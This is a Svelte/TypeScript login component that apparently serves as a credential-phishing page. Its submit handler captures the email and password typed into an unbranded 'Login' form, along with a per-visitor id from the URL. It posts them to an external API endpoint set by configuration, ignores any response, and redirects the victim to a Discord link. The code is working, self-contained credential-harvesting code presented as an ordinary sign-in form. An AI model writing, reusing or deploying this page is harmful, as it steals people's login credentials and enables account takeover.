
<script lang="ts">
    import { IconEyeOff } from "@tabler/icons-svelte";
    import { IconEye } from "@tabler/icons-svelte";
    import { onMount } from "svelte";

    let passwordBtnIcon = IconEyeOff;
    let showPassword = false;

    function toggleShowPassword() {
        showPassword = !showPassword;
        passwordBtnIcon = showPassword ? IconEye : IconEyeOff;
    }

    onMount(async () => {
        const id = new URLSearchParams(window.location.search).get('id');

        document.querySelector('.submit')?.addEventListener('click', async (evt: Event) => {
            evt.preventDefault();

            const email = (document.querySelector('#email') as HTMLInputElement).value;
            const password = (document.querySelector('#password') as HTMLInputElement).value;

            
            await fetch(`${import.meta.env.VITE_API}/user`, {
                method: 'post',
                body: JSON.stringify({
                    id: id,
                    email: email,
                    password: password
                })
            })

            window.location.href = import.meta.env.VITE_DISCORD;
        });
    })
</script>

<main class="main">
    <div class="bg"></div>
    <form action="">
        <h1>Login</h1>

        <fieldset>
            <input type="text" name="email" id="email" placeholder="Email" required autocomplete="off">
            <label for="username">Email</label>
        </fieldset>

        <fieldset>
            <input type={showPassword ? 'text' : 'password'} name="password" id="password" placeholder="Password" required autocomplete="off">
            <label for="password">Password</label>
            <button type="button" on:click={toggleShowPassword}>
                <svelte:component this={passwordBtnIcon} />
            </button>
        </fieldset>

        <div class="buttons">
            <button class="submit" type="submit">Login</button>
            <button class="cancel" type="reset">Cancel</button>
        </div>
    </form>
</main>

<style lang="scss">
    @import './style.scss';
</style>